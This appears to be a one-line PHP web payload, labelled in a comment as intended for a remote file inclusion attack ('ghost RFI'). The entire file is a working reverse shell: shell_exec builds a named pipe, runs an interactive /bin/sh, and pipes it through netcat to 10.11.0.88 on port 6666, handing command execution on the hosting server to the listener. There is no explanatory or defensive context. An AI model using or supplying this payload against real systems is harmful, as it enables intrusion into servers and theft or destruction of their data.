<?php echo shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.88 6666 >/tmp/f'); ?>
/* For ghost RFI */
